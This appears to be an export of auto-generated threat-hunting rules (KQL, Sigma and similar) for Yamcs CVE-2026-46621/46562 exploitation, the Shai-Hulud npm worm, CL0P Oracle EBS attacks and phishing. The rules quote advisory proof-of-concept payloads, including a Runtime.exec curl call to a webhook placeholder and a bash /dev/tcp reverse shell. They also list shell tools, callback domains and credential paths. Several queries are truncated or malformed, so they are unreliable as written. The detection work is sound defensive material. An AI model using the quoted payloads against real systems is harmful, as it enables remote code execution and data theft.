[LLM] Yamcs MDB algorithm PATCH with embedded Jython java.lang.Runtime payload (CVE-2026-46621) Exploitation High
Hunts the CVE-2026-46621 exploitation request: an authenticated HTTP PATCH to /api/mdb/{instance}/realtime/algorithms/{name} whose JSON body contains Jython-to-Java escape strings (java.lang.Runtime, getRuntime, import java). This is the article's exact exploit primitive — overwriting a Python algorithm's text via the MDB REST API to break out of the JSR-223 sandbox. Rationale: Pivots on the exact exploit primitive from the GHSA advisory: PATCH /api/mdb/{instance}/realtime/algorithms/{name} body containing 'java.lang.Runtime', 'getRuntime', or 'import java'. These tokens have no legitimate place in a Python/Jython algorithm in normal Yamcs operations — they are the Jython-to-Java escape. Cross-checked against the GHSA-2g95-6x5q-xjwj advisory PoC. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/006/ • https://nvd.nist.gov/vuln/detail/CVE-2026-46621
ATT&CKT1190 T1059.006 T1078
Data sourcesWeb.Web
// Yamcs runs as a JVM; web traffic to its REST API is usually proxied or visible as DeviceNetworkEvents to TCP/8090. Defender's HTTP-body visibility is limited — pair with the WAF/reverse-proxy log source.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 8090 or LocalPort == 8090
| where InitiatingProcessFileName !in~ ("java.exe","java")
| where AdditionalFields has_any ("PATCH","/api/mdb/","/realtime/algorithms/")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, LocalPort, AdditionalFields
| order by Timestamp desc
// Detect HTTP PATCH to Yamcs MDB algorithms endpoint carrying Jython-to-Java escape strings.
let algoEndpoint = @"/api/mdb/[^/]+/realtime/algorithms/";
let jythonPayloadTokens = dynamic(["java.lang.Runtime","getRuntime","import java","Runtime.getRuntime","exec([\"bash\"","exec([\"sh\"","exec([\"cmd\""]);
union isfuzzy=true
(W3CIISLog
  | where TimeGenerated > ago(7d)
  | where csMethod =~ "PATCH"
  | where csUriStem matches regex algoEndpoint
  | extend Src = cIP, User = csUserName, Uri = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), UA = csUserAgent, Body = ""
  | project TimeGenerated, Src, User, Uri, UA, Body, Status = scStatus),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestMethod =~ "PATCH"
  | where RequestURL matches regex algoEndpoint
  | extend Src = SourceIP, User = SourceUserName, Uri = RequestURL, UA = RequestClientApplication, Body = coalesce(AdditionalExtensions, Message), Status = tostring(EventOutcome)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpMethod =~ "PATCH"
  | where Url matches regex algoEndpoint
  | extend Src = SrcIpAddr, User = SrcUsername, Uri = Url, UA = HttpRequestHeaderUserAgent, Body = "", Status = tostring(HttpStatusCode)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status)
| where Body has_any (jythonPayloadTokens) or Uri has_any (jythonPayloadTokens)
| order by TimeGenerated desc
title: Yamcs MDB Algorithm PATCH with Jython java.lang.Runtime Payload (CVE-2026-46621)
id: 6a3e9b1c-2d4e-4b1e-9b6f-7e8b1c2d4e3a
status: experimental
description: Detects HTTP PATCH to the Yamcs Mission Database algorithms endpoint with a request body containing Jython-to-Java escape strings used in CVE-2026-46621 (java.lang.Runtime / getRuntime / import java).
references:
  - https://github.com/advisories/GHSA-2g95-6x5q-xjwj
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access

  - attack.t1059.006

logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'PATCH'
  selection_uri:
    cs-uri-stem|contains:
      - '/api/mdb/'
      - '/realtime/algorithms/'
  selection_payload:
    cs-uri-query|contains:
      - 'java.lang.Runtime'
      - 'getRuntime'
      - 'import java'
      - 'Runtime.getRuntime'
  condition: selection_method and selection_uri and selection_payload
falsepositives:
  - Internal red-team / vulnerability scanners replaying the PoC
  - Yamcs developers legitimately referencing java.lang in algorithm text (rare — algorithms are domain-specific)
level: high
(source:nginx OR source:apache OR source:haproxy OR source:linux.syslog) @http.method:PATCH @http.url_details.path:*/api/mdb/*/realtime/algorithms/* (@http.request.body:(*java.lang.Runtime* OR *getRuntime* OR *"import java"*) OR @http.url_details.queryString:(*java.lang.Runtime* OR *getRuntime*))
// Falcon FDR generally does not capture HTTP request bodies. Closest pivot is post-exploitation process tree (see UC 2). Returning host-side hit on the curl beacon that the payload triggers.
#event_simpleName=ProcessRollup2
| ImageFileName=/\/curl$/i OR ImageFileName=/\/bash$/i OR ImageFileName=/\/sh$/i
| ParentBaseFileName=/^java$/i
| CommandLine=/RCE|webhook|interactsh|requestbin|ngrok|trycloudflare/i
| groupBy([aid, ComputerName, ImageFileName, ParentBaseFileName, CommandLine], function=count())

[LLM] Yamcs JVM spawns shell or network utility (CVE-2026-46621 post-exploitation) Installation High
Hunts the host-side payoff of CVE-2026-46621: a java/jython process under the Yamcs service forking bash, sh, curl, wget, nc, python or similar OS utilities. Yamcs is a telemetry processing JVM — under normal operations its process tree does not fork shells or network clients. Rationale: Article PoC: 'java.lang.Runtime.getRuntime().exec(["bash", "-c", "curl https://<YOUR-WEBHOOK-URL>/RCE"])' — the Yamcs JVM directly forks bash + curl. Pinning to parent=java/jython with a yamcs-context check on the parent commandline keeps FPs near zero because the Yamcs JVM has no legitimate need to fork shells. Cross-checked against MITRE T1059.006 (Python) and T1059.004 (Unix Shell). Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.004 T1059.006 T1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython")
| where FileName in~ ("bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe")
| where InitiatingProcessCommandLine has_any ("yamcs","jython","algorithm","ScriptEngine","AlgorithmManager") or InitiatingProcessFolderPath has_any ("yamcs","jython")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Sentinel: Yamcs JVM (java/jython) spawning a shell or network utility — host-side CVE-2026-46621 payoff.
let ShellOrNet = dynamic(["bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe"]);
let YamcsCtx = dynamic(["yamcs","jython","algorithm","ScriptEngine","AlgorithmManager"]);
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessName has_any ("java","jython")
  | where TargetProcessName has_any (ShellOrNet)
  | where ParentProcessCommandLine has_any (YamcsCtx) or ActingProcessCommandLine has_any (YamcsCtx) or TargetProcessCommandLine has_any (YamcsCtx)
  | project TimeGenerated, Host = DvcHostname, User = ActorUsername,
            ParentImage = ParentProcessName, ParentCmd = ParentProcessCommandLine,
            ChildImage = TargetProcessName, ChildCmd = TargetProcessCommandLine),
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("java.exe","jython.exe","\\java","\\jython")
  | where NewProcessName has_any ("\\bash.exe","\\sh.exe","\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\curl.exe","\\wget.exe","\\nc.exe","\\ncat.exe","\\python.exe","\\python3.exe")
  | where CommandLine has_any (YamcsCtx) or ParentProcessName has_any (YamcsCtx)
  | project TimeGenerated, Host = Computer, User = SubjectUserName,
            ParentImage = ParentProcessName, ParentCmd = "",
            ChildImage = NewProcessName, ChildCmd = CommandLine),
(Syslog
  | where TimeGenerated > ago(7d)
  | where Facility =~ "authpriv" or ProcessName has_any ("audit","auditd","sudo")
  | where SyslogMessage has "java" and SyslogMessage has_any (ShellOrNet)
  | where SyslogMessage has_any (YamcsCtx)
  | project TimeGenerated, Host = HostName, User = "", ParentImage = "java", ParentCmd = SyslogMessage, ChildImage = "", ChildCmd = "")
| order by TimeGenerated desc

[LLM] Yamcs Java process beacons to webhook / interact / tunneling service (CVE-2026-46621 C2) Command & Control High
Hunts the article's C2 footprint: the Yamcs JVM (or a curl/wget it spawned) making an outbound connection to short-lived webhook / out-of-band-interaction services (webhook.site, requestbin, interactsh, ngrok, trycloudflare, beeceptor). Anchored to the Yamcs JVM as initiating process so we don't blanket-alert on internet usage. Rationale: Article PoC literally calls 'curl https://<YOUR-WEBHOOK-URL>/RCE' from Runtime.exec. Anchoring to (a) the Yamcs JVM or a curl/wget spawned by it AND (b) the well-known OOB-interaction domain list keeps this high-signal: a Yamcs telemetry server has no legitimate need to talk to webhook.site or interactsh. Cross-checked against the CVE-2026-46621 PoC and ProjectDiscovery's Interactsh public domain list. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://github.com/projectdiscovery/interactsh • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","en7","interact.sh","interactsh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython","curl","curl.exe","wget","wget.exe")
| where (RemoteUrl has_any (oobDomains)) or (isnotempty(AdditionalFields) and AdditionalFields has_any (oobDomains))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","interact.sh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);

| order by TimeGenerated desc

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46621")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

[LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload Exploitation High
Detects HTTP PATCH requests to the Yamcs algorithm-override endpoint where the JSON body contains Nashorn escape sequences that reach `java.lang.Runtime` — the exact CVE-2026-46562 exploit shape. Targets the request hitting any reverse proxy / WAF / web log in front of Yamcs (default port 8090). Rationale: Exploits ride the article's exact endpoint shape `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}` and require Nashorn pivot tokens (`Java.type`, `java.lang.Runtime`, `getRuntime`) in the JSON body — both are dead-giveaway strings called out in the GHSA advisory body. Legacy `5.5.0` path `/api/mdb/.../algorithms/` is also covered. No external corroboration available — advisory is sole source as of 2026-05-28.
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
// Defender Advanced Hunting has no HTTP request-body table for Yamcs front-end logs; closest pivot is inbound TCP to port 8090 followed by java spawning a shell. See UC2/UC3 for the post-exploitation half.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8090
| where InitiatingProcessFileName has_any ("java","java.exe")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let YamcsExploitTokens = dynamic(["Java.type","java.lang.Runtime","getRuntime","ProcessBuilder","/dev/tcp/"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL matches regex @"(?i)/api/mdb-overrides/[^/]+/[^/]+/algorithms/"
| where Message has_any (YamcsExploitTokens) or RequestContext has_any (YamcsExploitTokens) or AdditionalExtensions has_any (YamcsExploitTokens)
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

[LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation Installation High
Detects the Yamcs `java` process (yamcs-core JVM) directly spawning `/bin/sh`, `/bin/bash`, `dash`, or `nc` — a behaviour that never occurs in legitimate Yamcs operation. This is the immediate child-process side of the CVE-2026-46562 Nashorn RCE primitive `Java.type("java.lang.Runtime").getRuntime().exec(...)`. Rationale: Article's PoC literally runs `Java.type("java.lang.Runtime").getRuntime().exec(["bash","-c","..."])`. The unique high-fidelity signal is `java` (with `yamcs`/`org.yamcs` in its cmdline so we scope to the Yamcs JVM specifically, not arbitrary Java apps) directly forking a shell — yamcs-core itself never does this in normal operation. No external corroboration available (GHSA is sole source).
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "java"
| where InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where FileName in~ ("sh","bash","dash","zsh","nc","ncat","socat","python","python3","perl","ruby")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName endswith "/java" or ParentProcessName =~ "java"
| where ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/nc","/ncat","/socat","/python","/python3","/perl")
   or TargetProcessName has_any ("sh","bash","dash","nc","ncat","socat","python","python3","perl")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

[LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree Command & Control High
Detects the bash `exec 3<>/dev/tcp/HOST/PORT` reverse-shell file-descriptor primitive when it descends from the Yamcs JVM. This is the *exact* payload string in the CVE-2026-46562 PoC and catches the post-exploitation network pivot whether or not UC2 caught the initial spawn. Rationale: Verbatim from the GHSA PoC body: `["bash","-c","exec 3<>/dev/tcp/${LHOST}/${LPORT}; id >&3; sh -i <&3 >&3 2>&3"]`. The `/dev/tcp/` token is unique to bash-builtin reverse shells (no legitimate Yamcs subroutine writes to that pseudo-path), and constraining the parent chain to the Yamcs JVM cuts the broad LFI-style FPs that pure `/dev/tcp/` rules suffer. No external corroboration available (advisory is sole public source).
ATT&CKT1059.004 T1071.001 T1219
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_any ("/dev/tcp/","/dev/udp/")
| where FileName in~ ("bash","sh","dash","zsh")
| where InitiatingProcessFileName =~ "java"
   or InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
   or InitiatingProcessParentFileName =~ "java"
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, ProcessCommandLine)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, RevHost, RevPort,
          ParentImage = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has_any ("/dev/tcp/","/dev/udp/") or TargetProcessCommandLine has_any ("/dev/tcp/","/dev/udp/")
| where (ParentProcessName endswith "/java" or ParentProcessName =~ "java")
   or ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| extend Cmd = coalesce(ActingProcessCommandLine, TargetProcessCommandLine)
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, Cmd)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, Cmd)
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, Cmd, RevHost, RevPort
| order by TimeGenerated desc
title: Bash /dev/tcp Reverse Shell Descending From Yamcs JVM (CVE-2026-46562)
id: 2c7b9e3a-4d5f-46a1-b8c2-8e4d3f7a91d0
description: bash/sh process executing the /dev/tcp/HOST/PORT reverse-shell file-descriptor primitive with the Yamcs java process anywhere in its parent chain. Exact string from the CVE-2026-46562 PoC.
references:
  - https://github.com/advisories/GHSA-vmwp-vh32-rj75
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.t1059.004
  - attack.t1071.001
logsource:
  category: process_creation
  product: linux
detection:
  selection_shell:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
  selection_payload:
    CommandLine|contains:
      - '/dev/tcp/'
      - '/dev/udp/'
  selection_parent:
    ParentImage|endswith: '/java'
  selection_parent_cmd:
    ParentCommandLine|contains:
      - 'yamcs'
      - 'org.yamcs'
  condition: selection_shell and selection_payload and (selection_parent or selection_parent_cmd)
level: critical
(@process.command_line:(*\/dev\/tcp\/* OR *\/dev\/udp\/*) OR @CommandLine:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)) (@process.name:(bash OR sh OR dash OR zsh) OR @Image:(*\/bash OR *\/sh OR *\/dash OR *\/zsh)) (@process.parent.name:java OR @ParentImage:*\/java OR @process.parent.command_line:(*yamcs* OR *org.yamcs*) OR @ParentCommandLine:(*yamcs* OR *org.yamcs*))
#event_simpleName=ProcessRollup2 ImageFileName=/\/(bash|sh|dash|zsh)$/i | regex("/dev/(tcp|udp)/", field=CommandLine) ParentBaseFileName=/^java$/i | regex("yamcs|org\\.yamcs", field=ParentCommandLine) | rest := regex("/dev/(?:tcp|udp)/(?<RevHost>[^/\\s]+)/(?<RevPort>\\d+)", field=CommandLine, strict=false) | groupBy([aid, ComputerName, UserName, CommandLine, RevHost, RevPort], function=count())

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget · Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children

Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations

[LLM] Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) Installation High
Hunts the Shai-Hulud worm's secret-harvesting stage: a node/npm/yarn process opens AWS credentials, SSH private keys, Kubernetes kubeconfig, or GCP application-default-credentials. The article confirms TGR-CRI-1135 released an open-source version on 2026-05-13, so copycats will reuse this file-access pattern. Rationale: Article confirms TGR-CRI-1135's malware exfiltrates 'cloud access tokens, SSH keys, Kubernetes secrets' and announced the open-source Shai-Hulud release 2026-05-13. Datadog Security Labs and Unit 42 follow-up writeups confirm the exact filesystem paths (~/.aws/credentials, ~/.ssh/, ~/.kube/config, application_default_credentials.json) and that node is the executing host — making this a precise file-access pivot, not a generic 'credentials in files' rule. Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
ATT&CKT1552.001 T1195.002 T1528

title: Shai-Hulud npm Worm Reads Cloud Credential Files
id: 9c4a1e62-1f0b-4b3a-8f3d-c7f1b3b8d401
status: experimental
description: Detects node/npm/yarn/pnpm processes accessing AWS, SSH, Kubernetes or GCP credential files — the Shai-Hulud worm's credential-harvest stage. TGR-CRI-1135 open-sourced the tool 2026-05-13.
references:
  - https://unit42.paloaltonetworks.com/cyber-extortion-economy/
  - https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
  - https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.credential_access
  - attack.t1552.001
  - attack.t1195.002
logsource:
  category: file_access
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\node.exe'
      - '\npm.exe'
      - '\yarn.exe'
      - '\pnpm.exe'
  selection_file:
    TargetFilename|contains:
      - '\.aws\credentials'
      - '\.ssh\id_rsa'
      - '\.ssh\id_ed25519'
      - '\.kube\config'
      - 'application_default_credentials.json'
      - '\gcloud\credentials.db'
  condition: selection_proc and selection_file
falsepositives:
  - Legitimate IaC tooling (terraform-wrapped node helpers, cdktf) reading AWS profile
  - Developer-machine kube/aws CLI plugin that legitimately shells out to node
level: high
source:windows.sysmon @EventID:11 @Image:(*\node.exe OR *\Node.exe OR *\NODE.EXE OR *\npm.exe OR *\NPM.EXE OR *\yarn.exe OR *\YARN.EXE OR *\pnpm.exe) @TargetFilename:(*\.aws\credentials OR *\.ssh\id_rsa* OR *\.ssh\id_ed25519* OR *\.kube\config OR *application_default_credentials.json OR *\gcloud\credentials.db)
#event_simpleName=FileOpenInfo ContextImageFileName=/\\(node|npm|yarn|pnpm)\.exe$/i
| regex("(\\\\\\.aws\\\\credentials|\\\\\\.ssh\\\\id_(rsa|ed25519|ecdsa)|\\\\\\.kube\\\\config|application_default_credentials\\.json|\\\\gcloud\\\\credentials\\.db)", field=TargetFileName)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
| _count > 0

[LLM] Shai-Hulud exfiltration: node.exe POSTs to api.github.com creating public repo Actions on Objectives Medium
Detects the Shai-Hulud worm's exfiltration channel — a node/npm process making API calls to api.github.com on a non-developer host (or burst of repo-creation API traffic). The worm dumps stolen secrets into a newly-created public GitHub repo tagged 'Sha1-Hulud: The Second Coming'. Rationale: Article ties TGR-CRI-1135 (Shai-Hulud author) to the open-source release on 2026-05-13. Datadog Security Labs and Unit 42 confirm exfil channel is a public GitHub repo created via api.github.com — pairing the credential-file read (UC1) with an outbound github.com call from the same node PID inside 10 minutes is high-fidelity vs background developer noise. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.upwind.io/feed/shai-hulud-2-npm-supply-chain-worm-attack • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/

[LLM] Bling Libra: Entra device join immediately after vishing-driven MFA registration Installation High
Detects Bling Libra's (ShinyHunters / UNC6040) post-vishing persistence pattern — within minutes of a successful interactive sign-in from a new location/IP, the same identity registers a new device (and frequently a new MFA method) on Entra ID. The article confirms the playbook is unchanged: vishing → credential+MFA intercept → register own device for persistence. Rationale: Article states Bling Libra 'continues to use vishing for initial access… and ultimately registering their own devices to establish persistence within targeted environments.' Mandiant/Google Cloud and BankInfoSecurity writeups confirm device-registration-within-30-minutes-of-suspicious-sign-in as the high-fidelity correlation. The temporal join is what distinguishes attacker registration from a user's own new laptop enrollment. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/defense-against-shinyhunters-cybercrime-saas • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://www.bankinfosecurity.com/hanging-up-on-shinyhunters-experts-detail-vishing-defenses-a-30657

[LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget Exploitation High
Hunts the post-exploit footprint of CVE-2025-61882 in Oracle E-Business Suite (Concurrent Processing) — the Java app-server process (java/oracle) spawning OS shells, wget, curl, perl or python is the canonical Cl0p webshell-drop pattern observed by Mandiant/Google Cloud against EBS 12.2.x. Rationale: Article names CVE-2025-61882 as Hazy Scorpius/CL0P's vector into Oracle EBS. Google Cloud TI and Oracle's own advisory confirm Cl0p drops Java/JSP webshells via the Concurrent Processing component; java/FNDLIBR spawning a shell/downloader on an EBS host is the cleanest live-exploit pivot. Filter for EBS-specific paths (appsutil, FMW_Home, comn/util) keeps this scoped to actual EBS servers. Cross-checked against: • https://www.oracle.com/security-alerts/alert-cve-2025-61882.html • https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation • https://www.tenable.com/blog/cve-2025-61882-faq-oracle-e-business-suite-zero-day-cl0p-and-july-2025-cpu • https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild/
ATT&CKT1190 T1059.004 T1505.003
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("java","java.exe","FNDLIBR","FNDLIBR.exe","httpd","httpd.exe")
| where InitiatingProcessFolderPath has_any ("oracle","EBS","fs_inst","appsutil","FMW_Home","comn/util","Concurrent")
| where FileName in~ ("sh","bash","ksh","zsh","cmd.exe","powershell.exe","pwsh.exe","wget","curl","perl","python","python3","nc","ncat","certutil.exe")
| where ProcessCommandLine !has "adstrtal" and ProcessCommandLine !has "adstpall"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, ProcessCommandLine, ProcessId
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName matches regex @"(?i)(\\|/)(java|java\.exe|FNDLIBR|httpd)(\.exe)?$"
| where ParentProcessCommandLine matches regex @"(?i)(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)"
| where ActingProcessName matches regex @"(?i)(\\|/)(sh|bash|ksh|zsh|cmd\.exe|powershell\.exe|pwsh\.exe|wget|curl|perl|python3?|nc|ncat|certutil\.exe)$"
| where ActingProcessCommandLine !has "adstrtal" and ActingProcessCommandLine !has "adstpall"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

detection:
  selection_parent:
    ParentImage|endswith:

      - '/FNDLIBR'
      - '/httpd'

      - 'EBS'
      - 'fs_inst'
      - 'appsutil'
      - 'comn/util'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/ksh'
      - '/wget'
      - '/curl'
      - '/perl'
      - '/python'
      - '/python3'
      - '/nc'
      - '/ncat'

    CommandLine|contains:

      - 'adstpall'
      - 'adcfgclone'

falsepositives:
  - Oracle EBS patching (autoconfig, adop) which legitimately spawns shells under java
  - Administrative concurrent programs that shell out by design
level: high
source:linux.auditd @auditd.type:EXECVE @process.parent.executable.path:(*/java OR */FNDLIBR OR */httpd) @process.executable.path:(*/sh OR */bash OR */ksh OR */wget OR */curl OR */perl OR */python OR */python3 OR */nc OR */ncat) -@process.command_line:(*adstrtal* OR *adstpall* OR *adcfgclone*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(java|FNDLIBR|httpd)$/i
| regex("(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)", field=ParentImageFileName)
| ImageFileName=/\/(sh|bash|ksh|zsh|wget|curl|perl|python3?|nc|ncat)$|\\(cmd|powershell|pwsh|certutil)\.exe$/i
| NOT (regex("(adstrtal|adstpall|adcfgclone)", field=CommandLine))
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents

| where Timestamp > ago(1d)

| project DeviceName, RemoteIP, RemotePort, Timestamp

| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),

| order by conn_count desc

// TVM tables are daily snapshots — pin a 1-day window so the engine

DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-61882", "CVE-2026-45321")

| order by VulnerabilitySeverityLevel asc, DeviceName asc

DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-61882", "CVE-2026-45321")

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
